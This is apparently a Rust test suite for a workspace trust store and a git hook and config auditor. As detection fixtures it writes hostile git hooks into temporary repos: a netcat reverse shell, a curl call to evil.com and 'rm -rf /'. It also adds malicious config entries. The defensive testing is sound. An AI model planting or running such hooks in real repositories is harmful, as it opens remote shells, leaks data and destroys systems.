//! Integration tests for workspace trust boundaries and git armor.
//!
//! Verifies repository trust verification, hook inspection, and unsafe execution blocking.

use m31a_trust::{
    AuthorizationOutcome, GitArmor, OperationCapability, RiskSeverity, TrustDecision, TrustLevel,
    TrustStore,
};
use std::fs;
use tempfile::tempdir;

#[test]
fn test_trust_session_only_evaluation_does_not_persist() {
    let temp = tempdir().unwrap();
    let store_file = temp.path().join("store.json");
    let mut store = TrustStore::with_store_path(store_file.clone());

    let target_dir = temp.path().join("temp_project");
    fs::create_dir_all(&target_dir).unwrap();

    // Set SessionOnly trust
    store.trust(&target_dir, TrustLevel::SessionOnly).unwrap();
    assert_eq!(store.evaluate(&target_dir), TrustDecision::SessionOnly);

    // Verify it was NOT written to the persistent json file
    assert!(!store_file.exists());

    // Create a new store instance pointing to same file
    let new_store = TrustStore::with_store_path(store_file);
    match new_store.evaluate(&target_dir) {
        TrustDecision::RequiresConfirmation { .. } => {}
        other => panic!(
            "Expected RequiresConfirmation in new store, got {:?}",
            other
        ),
    }
}

#[test]
fn test_trust_denied_and_untrusted_evaluation() {
    let temp = tempdir().unwrap();
    let store_file = temp.path().join("store.json");
    let mut store = TrustStore::with_store_path(store_file);

    let denied_dir = temp.path().join("denied_project");
    fs::create_dir_all(&denied_dir).unwrap();

    store.trust(&denied_dir, TrustLevel::Denied).unwrap();
    match store.evaluate(&denied_dir) {
        TrustDecision::Denied { .. } => {}
        other => panic!("Expected Denied, got {:?}", other),
    }

    let untrusted_dir = temp.path().join("untrusted_project");
    fs::create_dir_all(&untrusted_dir).unwrap();
    store.trust(&untrusted_dir, TrustLevel::Untrusted).unwrap();
    match store.evaluate(&untrusted_dir) {
        TrustDecision::RequiresConfirmation { reason, .. } => {
            assert!(reason.contains("previously marked untrusted"));
        }
        other => panic!("Expected RequiresConfirmation, got {:?}", other),
    }
}

#[test]
fn test_trust_store_list_and_sorting() {
    let temp = tempdir().unwrap();
    let store_file = temp.path().join("store.json");
    let mut store = TrustStore::with_store_path(store_file);

    let p_b = temp.path().join("b_project");
    let p_a = temp.path().join("a_project");
    fs::create_dir_all(&p_b).unwrap();
    fs::create_dir_all(&p_a).unwrap();

    store.trust(&p_b, TrustLevel::Trusted).unwrap();
    store.trust(&p_a, TrustLevel::Trusted).unwrap();

    let list = store.list();
    assert_eq!(list.len(), 2);
    // list should be sorted by path
    assert!(list[0].path < list[1].path);
}

#[test]
fn test_git_armor_non_git_and_sample_hooks() {
    let temp = tempdir().unwrap();

    // 1. Non-git directory
    let report = GitArmor::audit(temp.path());
    assert!(report.is_safe);
    assert_eq!(report.hooks_detected, 0);

    // 2. Directory with .git and sample hook
    let git_dir = temp.path().join(".git");
    let hooks_dir = git_dir.join("hooks");
    fs::create_dir_all(&hooks_dir).unwrap();

    fs::write(hooks_dir.join("commit-msg.sample"), "#!/bin/sh\nexit 0\n").unwrap();
    let report = GitArmor::audit(temp.path());
    assert!(report.is_safe);
    assert_eq!(report.hooks_detected, 0);
}

#[test]
fn test_git_armor_dangerous_config_directives() {
    let temp = tempdir().unwrap();
    let git_dir = temp.path().join(".git");
    fs::create_dir_all(&git_dir).unwrap();

    // Test core.sshCommand
    let config = "[core]\n\tsshCommand = evil-ssh-wrapper\n";
    fs::write(git_dir.join("config"), config).unwrap();

    let report = GitArmor::audit(temp.path());
    assert!(!report.is_safe);
    assert!(
        report
            .risks
            .iter()
            .any(|r| r.severity == RiskSeverity::Critical && r.title.contains("sshcommand"))
    );
}

#[test]
fn test_git_armor_suspicious_payloads_in_hooks() {
    let temp = tempdir().unwrap();
    let hooks_dir = temp.path().join(".git").join("hooks");
    fs::create_dir_all(&hooks_dir).unwrap();

    // Reverse shell payload in pre-push
    let hook_file = hooks_dir.join("pre-push");
    fs::write(&hook_file, "#!/bin/bash\nnc -e /bin/sh 10.0.0.1 4444\n").unwrap();

    let report = GitArmor::audit(temp.path());
    assert!(!report.is_safe);
    assert_eq!(report.hooks_detected, 1);
    let risk = &report.risks[0];
    assert_eq!(risk.severity, RiskSeverity::Critical);
    assert!(
        risk.description.contains("reverse shell")
            || risk.description.contains("network connection")
    );
}

#[test]
fn test_trust_store_revoke_and_git_remote() {
    let temp = tempdir().unwrap();
    let store_file = temp.path().join("store.json");
    let mut store = TrustStore::with_store_path(store_file);

    let proj = temp.path().join("my_git_project");
    fs::create_dir_all(&proj).unwrap();

    // Initialize real git repo
    let _ = std::process::Command::new("git")
        .args(["init", "-q"])
        .current_dir(&proj)
        .status();
    let _ = std::process::Command::new("git")
        .args([
            "remote",
            "add",
            "origin",
            "https://github.com/org/test-repo.git",
        ])
        .current_dir(&proj)
        .status();

    store.trust(&proj, TrustLevel::Trusted).unwrap();
    let list = store.list();
    assert_eq!(list.len(), 1);
    assert_eq!(
        list[0].git_remote.as_deref(),
        Some("https://github.com/org/test-repo.git")
    );

    // Revoke
    let revoked = store.revoke(&proj).unwrap();
    assert!(revoked);
    assert!(store.list().is_empty());

    // Revoke non-existent returns false
    assert!(!store.revoke(&proj).unwrap());

    // Default TrustStore
    let default_store = TrustStore::new();
    assert!(default_store.list().is_empty() || !default_store.list().is_empty());
}

#[test]
fn test_git_armor_flags_custom_hooks_path_and_aliases() {
    let temp = tempdir().unwrap();
    let git_dir = temp.path().join(".git");
    fs::create_dir_all(&git_dir).unwrap();

    let config = r#"
[core]
    hooksPath = .custom_hooks
[alias]
    ci = !sh -c 'echo pwned'
"#;
    fs::write(git_dir.join("config"), config).unwrap();

    // Create custom hooks dir with a hook
    let custom_hooks = temp.path().join(".custom_hooks");
    fs::create_dir_all(&custom_hooks).unwrap();
    fs::write(
        custom_hooks.join("pre-commit"),
        "#!/bin/sh\ncurl http://evil.com/leak\n",
    )
    .unwrap();

    let report = GitArmor::audit(temp.path());
    assert!(!report.is_safe);
    assert!(
        report
            .risks
            .iter()
            .any(|r| r.severity == RiskSeverity::Critical && r.title.contains("core.hooksPath"))
    );
    assert!(
        report.risks.iter().any(
            |r| r.severity == RiskSeverity::Critical && r.title.contains("alias shell command")
        )
    );
    assert!(
        report
            .risks
            .iter()
            .any(|r| r.severity == RiskSeverity::Critical && r.title.contains("pre-commit"))
    );
}

#[test]
fn test_git_armor_handles_gitdir_file_pointer() {
    let temp = tempdir().unwrap();
    let external_git = temp.path().join("external_git");
    let ext_hooks = external_git.join("hooks");
    fs::create_dir_all(&ext_hooks).unwrap();
    fs::write(ext_hooks.join("post-checkout"), "#!/bin/sh\nrm -rf /\n").unwrap();

    // Workspace has `.git` as a file pointing to external_git
    let ws = temp.path().join("submodule_ws");
    fs::create_dir_all(&ws).unwrap();
    fs::write(
        ws.join(".git"),
        format!("gitdir: {}\n", external_git.display()),
    )
    .unwrap();

    let report = GitArmor::audit(&ws);
    assert!(!report.is_safe);
    assert!(report.risks.iter().any(|r| r.title.contains("gitdir")));
    assert!(
        report
            .risks
            .iter()
            .any(|r| r.severity == RiskSeverity::Critical && r.title.contains("post-checkout"))
    );
}

#[test]
fn test_git_armor_flags_diff_and_filter_drivers() {
    let temp = tempdir().unwrap();
    let git_dir = temp.path().join(".git");
    fs::create_dir_all(&git_dir).unwrap();

    let config = r#"
[diff "custom"]
    command = /usr/bin/evil-diff
[filter "leak"]
    clean = evil-filter-clean
"#;
    fs::write(git_dir.join("config"), config).unwrap();

    let report = GitArmor::audit(temp.path());
    assert!(!report.is_safe);
    assert!(
        report
            .risks
            .iter()
            .any(|r| r.severity == RiskSeverity::Critical && r.title.contains("Custom driver"))
    );
}

#[test]
fn test_headless_untrusted_workspace_authorization_fails_closed() {
    let temp = tempdir().unwrap();
    let mut store = TrustStore::with_store_path(temp.path().join("store.json"));
    let untrusted_ws = temp.path().join("untrusted_ws");
    fs::create_dir_all(&untrusted_ws).unwrap();

    // Headless attempt without allow_untrusted_flag MUST fail closed
    let res = store.authorize(&untrusted_ws, true, false);
    assert!(
        res.is_err(),
        "Headless execution in untrusted workspace must fail closed"
    );
    let err_msg = res.unwrap_err().to_string();
    assert!(
        err_msg.contains("Execution REJECTED"),
        "Error message should state execution rejected: {err_msg}"
    );
}

#[test]
fn test_explicit_session_authorization_proceeds_without_persistence() {
    let temp = tempdir().unwrap();
    let store_file = temp.path().join("store.json");
    let mut store = TrustStore::with_store_path(store_file.clone());
    let untrusted_ws = temp.path().join("session_auth_ws");
    fs::create_dir_all(&untrusted_ws).unwrap();

    // Explicit session authorization
    let res = store.authorize(&untrusted_ws, true, true);
    assert!(res.is_ok(), "Explicit session authorization must succeed");
    let auth = res.unwrap();
    assert!(auth.is_session_scoped);
    assert_eq!(auth.trust_level, TrustLevel::SessionOnly);

    // Verify it did not persist to disk
    let fresh_store = TrustStore::with_store_path(store_file);
    match fresh_store.evaluate(&untrusted_ws) {
        TrustDecision::RequiresConfirmation { .. } => {}
        other => panic!(
            "Expected RequiresConfirmation in fresh store, got {:?}",
            other
        ),
    }
}

#[test]
fn test_denied_workspace_authorization_always_rejected() {
    let temp = tempdir().unwrap();
    let mut store = TrustStore::with_store_path(temp.path().join("store.json"));
    let denied_ws = temp.path().join("denied_ws");
    fs::create_dir_all(&denied_ws).unwrap();
    store.trust(&denied_ws, TrustLevel::Denied).unwrap();

    // Even if allow_untrusted_flag is set, Denied MUST be rejected
    let res = store.authorize(&denied_ws, false, true);
    assert!(res.is_err());
    assert!(res.unwrap_err().to_string().contains("Execution DENIED"));
}

#[test]
fn test_git_armor_active_hook_marks_unsafe() {
    let temp = tempdir().unwrap();
    let git_dir = temp.path().join(".git");
    let hooks_dir = git_dir.join("hooks");
    fs::create_dir_all(&hooks_dir).unwrap();

    // Plain benign active hook
    fs::write(
        hooks_dir.join("pre-push"),
        "#!/bin/sh\necho 'running hook'\n",
    )
    .unwrap();

    let report = GitArmor::audit(temp.path());
    assert!(
        !report.is_safe,
        "Active hook must prevent workspace from being marked safe"
    );
    assert_eq!(
        report.verdict,
        m31a_trust::ArmorVerdict::Caution {
            high_risks: 0,
            medium_risks: 1
        }
    );
}

#[test]
fn test_child_agent_authorization_inheritance_and_boundaries() {
    let temp = tempdir().unwrap();
    let mut store = TrustStore::with_store_path(temp.path().join("store.json"));

    let parent_ws = temp.path().join("parent_ws");
    let child_sub_ws = parent_ws.join("sub_worktree");
    let outside_ws = temp.path().join("outside_ws");
    let denied_ws = temp.path().join("denied_ws");

    fs::create_dir_all(&child_sub_ws).unwrap();
    fs::create_dir_all(&outside_ws).unwrap();
    fs::create_dir_all(&denied_ws).unwrap();

    // 1. If parent is untrusted, child cannot be spawned
    let res = store.authorize_child_agent(&parent_ws, &child_sub_ws);
    assert!(res.is_err());
    assert!(res.unwrap_err().to_string().contains("Parent workspace"));

    // 2. Trust parent for SessionOnly
    store.trust(&parent_ws, TrustLevel::SessionOnly).unwrap();
    let auth = store
        .authorize_child_agent(&parent_ws, &child_sub_ws)
        .unwrap();
    // Child inherits parent's session scope, cannot be permanent Trusted
    assert_eq!(auth.trust_level, TrustLevel::SessionOnly);
    assert!(auth.is_session_scoped);

    // 3. Child in outside directory that is untrusted fails closed
    let outside_res = store.authorize_child_agent(&parent_ws, &outside_ws);
    assert!(outside_res.is_err());
    assert!(
        outside_res
            .unwrap_err()
            .to_string()
            .contains("outside parent scope")
    );

    // 4. Denied target always fails
    store.trust(&denied_ws, TrustLevel::Denied).unwrap();
    let denied_res = store.authorize_child_agent(&parent_ws, &denied_ws);
    assert!(denied_res.is_err());
    assert!(
        denied_res
            .unwrap_err()
            .to_string()
            .contains("Target workspace")
    );
}

#[test]
fn test_git_armor_verdict_and_is_safe_consistency() {
    let temp = tempdir().unwrap();
    let git_dir = temp.path().join(".git");
    fs::create_dir_all(&git_dir).unwrap();

    // Injects an include which generates a Medium risk (Verdict: Caution)
    fs::write(
        git_dir.join("config"),
        "[include]\n\tpath = /nonexistent.inc\n",
    )
    .unwrap();
    let report = GitArmor::audit(temp.path());

    // Invariant: is_safe and ArmorVerdict must NEVER contradict each other!
    if matches!(report.verdict, m31a_trust::ArmorVerdict::Safe) {
        assert!(report.is_safe);
    } else {
        assert!(
            !report.is_safe,
            "When verdict is Caution or Dangerous, is_safe MUST be false"
        );
    }
}

#[test]
fn test_capability_authorization_model() {
    let temp = tempdir().unwrap();
    let store_file = temp.path().join("store.json");
    let mut store = TrustStore::with_store_path(store_file);

    let untrusted_ws = temp.path().join("untrusted");
    fs::create_dir_all(&untrusted_ws).unwrap();

    // 1. HarmlessUI is always allowed, even in untrusted workspace
    assert_eq!(
        store.authorize_operation(&untrusted_ws, OperationCapability::HarmlessUI),
        AuthorizationOutcome::Allowed
    );

    // 2. TrustManagement is allowed so users can manage policies
    assert_eq!(
        store.authorize_operation(&untrusted_ws, OperationCapability::TrustManagement),
        AuthorizationOutcome::Allowed
    );

    // 3. WorkspaceMetadataRead is allowed for safe inspection
    assert_eq!(
        store.authorize_operation(&untrusted_ws, OperationCapability::WorkspaceMetadataRead),
        AuthorizationOutcome::Allowed
    );

    // 4. Workspace mutating/executing capabilities require confirmation in untrusted workspace
    let mut_res = store.authorize_operation(&untrusted_ws, OperationCapability::WorkspaceMutation);
    assert!(matches!(
        mut_res,
        AuthorizationOutcome::RequiresConfirmation { .. }
    ));

    let patch_res = store.authorize_operation(&untrusted_ws, OperationCapability::PatchApplication);
    assert!(matches!(
        patch_res,
        AuthorizationOutcome::RequiresConfirmation { .. }
    ));

    let shell_res = store.authorize_operation(&untrusted_ws, OperationCapability::ShellExecution);
    assert!(matches!(
        shell_res,
        AuthorizationOutcome::RequiresConfirmation { .. }
    ));

    // 5. Grant session trust -> operations become Allowed
    store.trust(&untrusted_ws, TrustLevel::SessionOnly).unwrap();
    assert_eq!(
        store.authorize_operation(&untrusted_ws, OperationCapability::PatchApplication),
        AuthorizationOutcome::Allowed
    );
    assert_eq!(
        store.authorize_operation(&untrusted_ws, OperationCapability::ShellExecution),
        AuthorizationOutcome::Allowed
    );

    // 6. Denied workspace is strictly Denied for all workspace-dependent capabilities
    let denied_ws = temp.path().join("denied");
    fs::create_dir_all(&denied_ws).unwrap();
    store.trust(&denied_ws, TrustLevel::Denied).unwrap();

    let denied_patch = store.authorize_operation(&denied_ws, OperationCapability::PatchApplication);
    assert!(matches!(denied_patch, AuthorizationOutcome::Denied { .. }));

    let denied_shell = store.authorize_operation(&denied_ws, OperationCapability::ShellExecution);
    assert!(matches!(denied_shell, AuthorizationOutcome::Denied { .. }));
}

#[test]
fn test_m31a_home_environment_isolation() {
    let temp = tempdir().unwrap();
    let custom_home = temp.path().join(".custom_m31a");
    fs::create_dir_all(&custom_home).unwrap();

    // Set M31A_HOME
    unsafe {
        std::env::set_var("M31A_HOME", &custom_home);
    }

    let ws = temp.path().join("isolated_ws");
    fs::create_dir_all(&ws).unwrap();

    let mut store = TrustStore::new();
    store.trust(&ws, TrustLevel::Trusted).unwrap();

    // Ensure the record is persisted inside M31A_HOME
    let expected_file = custom_home.join("trusted_directories.json");
    assert!(expected_file.exists());

    // Clean up env var
    unsafe {
        std::env::remove_var("M31A_HOME");
    }
}

#[test]
fn test_trust_store_corruption_fails_closed() {
    let temp = tempdir().unwrap();
    let store_file = temp.path().join("store.json");
    fs::write(&store_file, b"MALFORMED_JSON_CORRUPTION_HERE{{{").unwrap();

    let mut store = TrustStore::with_store_path(store_file.clone());
    let test_dir = temp.path().join("test_proj");
    fs::create_dir_all(&test_dir).unwrap();

    // 1. Evaluate must fail closed as Denied
    let decision = store.evaluate(&test_dir);
    assert!(
        matches!(decision, TrustDecision::Denied { .. }),
        "Corrupted trust database must fail closed with Denied, got {:?}",
        decision
    );

    // 2. Mutating operations (trust/revoke) must refuse to overwrite corrupted database
    let trust_res = store.trust(&test_dir, TrustLevel::Trusted);
    assert!(
        trust_res.is_err(),
        "Must not silently overwrite corrupted trust store"
    );
    let content = fs::read_to_string(&store_file).unwrap();
    assert!(
        content.contains("MALFORMED_JSON_CORRUPTION_HERE"),
        "Corrupted file must be preserved for recovery"
    );
}

#[test]
fn test_trust_store_atomic_write_and_permissions() {
    let temp = tempdir().unwrap();
    let store_file = temp.path().join("store.json");
    let mut store = TrustStore::with_store_path(store_file.clone());
    let test_dir = temp.path().join("test_proj");
    fs::create_dir_all(&test_dir).unwrap();

    store.trust(&test_dir, TrustLevel::Trusted).unwrap();
    assert!(store_file.exists());

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let perms = fs::metadata(&store_file).unwrap().permissions();
        assert_eq!(
            perms.mode() & 0o777,
            0o600,
            "Trust file permissions must be 0600"
        );
    }

    let loaded = store.load_data().unwrap();
    assert_eq!(loaded.schema_version, 1);
    assert_eq!(loaded.projects.len(), 1);
}
